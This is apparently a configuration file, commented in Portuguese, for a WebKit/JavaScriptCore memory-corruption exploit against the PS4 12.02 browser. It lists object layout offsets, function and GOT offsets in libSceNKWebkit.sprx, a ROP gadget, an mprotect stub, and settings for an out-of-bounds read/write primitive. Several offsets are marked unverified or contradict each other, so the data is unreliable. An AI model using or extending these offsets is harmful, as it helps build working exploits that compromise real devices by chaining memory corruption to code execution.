// js/config.mjs

// Firmware: PS4 12.02 (Com base na análise dos TXT fornecidos)
// !! OFFSETS VALIDADOS E ATUALIZADOS COM BASE NOS ARQUIVOS DE DISASSEMBLY FORNECIDOS !!
//    É crucial continuar validando no contexto do seu exploit específico.
export const JSC_OFFSETS = {
    JSCell: {
        // VALIDADO: `mov rdx, [rsi+8]` em `JSC::JSObject::put` (funcoes.txt)
        // rsi é JSCell*, rdx é Structure*.
       
        STRUCTURE_POINTER_OFFSET: 0x8, // CANDIDATO: Ponteiro para a estrutura Structure
        // Se o ID estivesse direto na célula: STRUCTURE_ID_OFFSET: 0x0 (ou 0x4), FLAGS_OFFSET: 0x4 (ou 0x0)
        // Vamos manter seu original por enquanto, mas o STRUCTURE_POINTER_OFFSET acima é uma forte hipótese.
        STRUCTURE_ID_OFFSET: 0x00, // Seu valor original, VERIFIQUE se é ID direto ou se deve usar o ponteiro acima.
        FLAGS_OFFSET: 0x04       // Seu valor original
    },
    Structure: { // Offsets DENTRO da estrutura Structure (apontada por JSCell.STRUCTURE_POINTER_OFFSET)
        GLOBAL_OBJECT_OFFSET: 0x00,        // mov [rdi], r8 (r8 = JSGlobalObject*)
        PROTOTYPE_OFFSET: 0x08,            // mov [rdi+8h], r9 (r9 = JSValue do protótipo)
        TYPE_INFO_FLAGS_OFFSET: 0x10,      // mov [rdi+10h], eax (TypeInfo.m_flags e .m_type)
                                           // Este campo provavelmente contém o StructureID real e flags de tipo.
        INDEXING_TYPE_AND_MISC_OFFSET: 0x18, // mov [rdi+18h], r10d (indexingType)
        CLASS_INFO_OFFSET: 0x1C,           // mov [rdi+1Ch], rcx (rcx = ClassInfo*)
       
        VIRTUAL_PUT_OFFSET: 0x18,          // call qword ptr [rdx+18h] (Pode ser um offset dentro de ClassInfo ou vtable inline)
                                           // Nota: Este 0x18 é diferente do INDEXING_TYPE_AND_MISC_OFFSET acima. Contexto é chave.
    },
    JSObject: {
        // Ponteiro para o Butterfly (armazenamento de propriedades nomeadas)
        // Comum ser após o cabeçalho JSCell (Structure* em 0x8).
        BUTTERFLY_OFFSET: 0x10, // CANDIDATO: Ponteiro para o Butterfly
    },
    ArrayBuffer: {    
        // Baseado no snippet JSC::ArrayBuffer::create, o ponteiro para ArrayBufferContents
        // não é definido em [rax+8] ou [rax+10h] *nessa função específica*.
        // Ele é zerado e depois os campos do ArrayBufferContents são copiados para o JSArrayBuffer.
        // Mantendo 0x10 como estava no seu config original, pois é um offset comum
        // para um ponteiro de implementação em objetos wrapper. Precisa de mais investigação
        // para o JSArrayBuffer finalizado. Por enquanto, vamos usar o que você tem.
        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // OU 0x8 SE VOCÊ CONFIRMAR PARA JSArrayBuffer
        SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x18, // Confirmado por `mov [rax+18h], rdx` (onde rdx era m_sizeInBytes)
        // Adicionar o campo que parece conter o m_dataPointer diretamente no JSArrayBuffer
        DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START: 0x20, // Confirmado por `mov [rax+20h], rdx` (onde rdx era m_dataPointer)
        SHARING_MODE_OFFSET: 0x28,
        IS_RESIZABLE_FLAGS_OFFSET: 0x30,

        KnownStructureIDs: { // <--- MOVIDO PARA DENTRO DE ArrayBuffer
            // Exemplo: JSString_STRUCTURE_ID: 0x01040C00, // Encontre o valor real!
            // Exemplo: ArrayBuffer_STRUCTURE_ID: 0x01082300, // Encontre o valor real!
            // Exemplo: JSArray_STRUCTURE_ID: 0x01080300, // Encontre o valor real!
            // Exemplo: JSObject_Simple_STRUCTURE_ID: 0x010400F0, // Para {} // Encontre o valor real!
            // Adicione mais conforme necessário
            JSString_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO
            ArrayBuffer_STRUCTURE_ID: 2, // VALIDADO do JSC::ArrayBuffer::create
            JSArray_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO
            JSObject_Simple_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO
        }
    },
    ArrayBufferView: { // Para TypedArrays como Uint8Array, Uint32Array, DataView
        // VALIDADO (de JSObjectGetTypedArrayBytesPtr.txt):
        // `mov rax, [rdi+10h]` onde rdi é a View, rax é ArrayBufferContents*
        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // Ponteiro para ArrayBufferContents             
        STRUCTURE_ID_OFFSET: 0x00,           // Seu original.
        FLAGS_OFFSET: 0x04,                  // Seu original.
        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x08, // Ponteiro para o JSArrayBuffer.
        M_VECTOR_OFFSET: 0x10,               // Ponteiro para os dados (dentro do ArrayBuffer.m_impl->data()).
        M_LENGTH_OFFSET: 0x18,               // Comprimento da view.
        M_MODE_OFFSET: 0x1C                  // Modo (ex: WastefulWriting).
    },
    ArrayBufferContents: { // Estrutura apontada por ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET
                           // e ArrayBufferView.CONTENTS_IMPL_POINTER_OFFSET
        // VALIDADO (de JSObjectGetTypedArrayBytesPtr.txt):
        // `mov rcx, [rax+8]` onde rax é ArrayBufferContents*, rcx é m_size
        SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START: 0x8, // m_sizeInBytes (tamanho real do buffer de dados)

        // VALIDADO (de JSObjectGetTypedArrayBytesPtr.txt):
        // `mov rdx, [rax+10h]` onde rax é ArrayBufferContents*, rdx é m_dataPointer
        DATA_POINTER_OFFSET_FROM_CONTENTS_START: 0x10, // m_dataPointer (ponteiro para os bytes brutos)

        // Outros campos possíveis (precisam de validação):
        // REF_COUNT_OFFSET: 0x0, // Contagem de referências
        // DESTRUCTOR_OFFSET: 0x4 ou um ponteiro em 0x0 se for o primeiro campo após vtable
    },
    JSFunction: {
        // Estes são mais complexos e dependem da estrutura JSFunction específica
         EXECUTABLE_OFFSET: 0x18, // Ponteiro para FunctionExecutable
         SCOPE_OFFSET: 0x20,      // Ponteiro para JSScope
    }
    // KnownStructureIDs FOI MOVIDO PARA DENTRO DE JSC_OFFSETS.ArrayBuffer
};

// Informações da biblioteca WebKit (para calcular endereços base a partir de leaks)
// Estes são nomes simbólicos. Os valores reais dos offsets devem ser preenchidos
// a partir de um WebKit desmontado da MESMA VERSÃO do PS4 12.02.
export const WEBKIT_LIBRARY_INFO = {
    // Nome da biblioteca como aparece no sistema ou depurador
    LIBRARY_NAME: "libSceNKWebkit.sprx", // ou similar

    FUNCTION_OFFSETS: { // Offsets relativos ao base do módulo principal (libSceNKWebkit.sprx)
        // Exemplo: "WTF::fastMalloc_offset_from_lib_base": 0x123450, // Substitua pelo offset real
        "JSC::JSFunction::create": "0x58A1D0",                 // download (4), (26), (28)
        "JSC::InternalFunction::createSubclassStructure": "0xA86580", // download (5), (6)
        "WTF::StringImpl::destroy": "0x10AA800",               // download (7), (10)
        "bmalloc::Scavenger::schedule": "0x2EBDB0",             // download (7)
        "WebCore::JSLocation::createPrototype": "0xD2E30",       // download (34)
        "WebCore::cacheDOMStructure": "0x740F30",              // download (11), (21), (20)
        "mprotect_plt_stub": "0x1A08",                         // download (22) (PLT stub, jmps para GOT)
        "JSC::JSWithScope::create": "0x9D6990",                // download (23)
        "JSC::JSObject::putByIndex": "0x1EB3B00",             // download (24)
        "JSC::JSInternalPromise::create": "0x112BB00",        // download (25)
        "JSC::JSInternalPromise::then": "0x1BC2D70",          // download (16)
        "JSC::loadAndEvaluateModule": "0xFC2900",              // download (27)
        "JSC::ArrayBuffer::create_from_arraybuffer_ref": "0x170A490", // download (29), (30) (create(ArrayBuffer&))
        "JSC::ArrayBuffer::create_from_contents": "0x10E5320", // download (37) (create(ArrayBufferContents&&))
        "JSC::SymbolObject::finishCreation": "0x102C8F0",       // download (31)
        "JSC::StructureCache::emptyStructureForPrototypeFromBaseStructure": "0xCCF870", // download (32)
        "JSC::JSObject::put": "0xBD68B0",                     // download (33)
        "JSC::Structure::Structure_constructor": "0x1638A50",    // download (36)
        "WTF::fastMalloc": "0x1271810",                        // download (10) - verifique se é o mais comum
        "WTF::fastFree": "0x230C7D0",                          // download (14) - verifique se é o mais comum
        "JSValueIsSymbol": "0x126D940",                         // download (17)
        "JSC::JSArray::getOwnPropertySlot": "0x2322630",       // download (18)
        "JSC::JSGlobalObject::visitChildren_JSCell": "0x1A5F740", // download (19)
        "JSC::JSCallee::JSCallee_constructor": "0x2038D50",      // download (20)

        // Gadgets ROP/JOP que você encontrar:
        "gadget_lea_rax_rdi_plus_20_ret": "0x58B860",         // download (3)
        // Adicione mais gadgets aqui
    },

    // Offsets de entradas na Global Offset Table (GOT) que apontam para funções
    // em outras bibliotecas (ex: libc, libkernel). Ler estes pode vazar endereços de outras libs.
    GOT_ENTRIES: {
        "mprotect": "0x3CBD820", // Este é um endereço absoluto ou um offset da GOT? Se for absoluto, não é um offset.
        // Exemplo: "got_pthread_create_offset_from_lib_base": 0x2F00128, // Offset da entrada da GOT para pthread_create
    }
};

// Configuração para a primitiva Out-Of-Bounds
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 32768, // Tamanho do ArrayBuffer usado para a primitiva OOB
    BASE_OFFSET_IN_DV: 128,  // Offset onde a DataView "controlada" começa dentro do ArrayBuffer
    INITIAL_BUFFER_SIZE: 32 // Tamanho inicial do buffer para a trigger (pode não ser mais usado)
};

// Função para atualizar OOB_CONFIG da UI (se houver) - Mantenha como estava
export function updateOOBConfigFromUI(docInstance) {
    if (!docInstance) return;
    const oobAllocSizeEl = docInstance.getElementById('oobAllocSize');
    const baseOffsetEl = docInstance.getElementById('baseOffset');
    const initialBufSizeEl = docInstance.getElementById('initialBufSize');

    if (oobAllocSizeEl && oobAllocSizeEl.value !== undefined) {
        const val = parseInt(oobAllocSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
    }
    if (baseOffsetEl && baseOffsetEl.value !== undefined) {
        const val = parseInt(baseOffsetEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
    }
    if (initialBufSizeEl && initialBufSizeEl.value !== undefined) {
        const val = parseInt(initialBufSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
    }
}
